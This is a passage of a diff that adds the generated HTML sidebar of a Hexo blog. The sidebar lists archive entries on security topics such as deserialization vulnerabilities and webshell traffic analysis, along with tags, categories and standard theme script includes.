class="toc-text">总结</span></a></li></ol></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 9
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span>
+            <a class="archive-post-title" href="/2022/09/08/%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">常见Webshell连接工具流量分析</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span>
+            <a class="archive-post-title" href="/2022/09/01/arm%20u%20chrome/">Arm U Chrome</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span>
+            <a class="archive-post-title" href="/2022/08/11/urldns/">URLDNS链</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span>
+            <a class="archive-post-title" href="/2022/08/09/docker%E4%BD%BF%E7%94%A8/">docker使用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span>
+            <a class="archive-post-title" href="/2022/08/09/mysql%E8%9C%9C%E7%BD%90%E5%8F%8D%E5%88%B6/">Mysql蜜罐反制</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span>
+            <a class="archive-post-title" href="/2022/08/06/lab9-1/">恶意代码分析lab9-1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span>
+            <a class="archive-post-title" href="/2022/08/06/shiro/">Shiro反序列化漏洞</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">Fastjson 反序列化漏洞</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2022/07/31/windows%E4%B8%8Bsocket%E9%80%9A%E4%BF%A1/">windows下socket通信</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="docker">
+                <span class="iconfont-archer">&#xe606;</span>
+                docker
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="黑科技">
+                <span class="iconfont-archer">&#xe606;</span>
+                黑科技
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="攻防">
+                <span class="iconfont-archer">&#xe606;</span>
+                攻防
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="java安全">
+                <span class="iconfont-archer">&#xe606;</span>
+                java安全
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="恶意代码">
+                <span class="iconfont-archer">&#xe606;</span>
+                恶意代码
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="二进制">
+                <span class="iconfont-archer">&#xe606;</span>
+                二进制
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="java框架">
+                <span class="iconfont-archer">&#xe606;</span>
+                java框架
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="windows">
+                <span class="iconfont-archer">&#xe606;</span>
+                windows
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="windows编程">
+                <span class="iconfont-archer">&#xe606;</span>
+                windows编程
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="web安全">
+                <span class="iconfont-archer">&#xe606;</span>
+                web安全
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="docker">
+            <span class="iconfont-archer">&#xe60a;</span>
+            docker
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="黑科技">
+            <span class="iconfont-archer">&#xe60a;</span>
+            黑科技
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="红蓝攻防">
+            <span class="iconfont-archer">&#xe60a;</span>
+            红蓝攻防
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="java安全">
+            <span class="iconfont-archer">&#xe60a;</span>
+            java安全
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="恶意代码">
+            <span class="iconfont-archer">&#xe60a;</span>
+            恶意代码
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="windows逆向">
+            <span class="iconfont-archer">&#xe60a;</span>
+            windows逆向
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="web安全">
+            <span class="iconfont-archer">&#xe60a;</span>
+            web安全
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="编程">
+            <span class="iconfont-archer">&#xe60a;</span>
+            编程
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
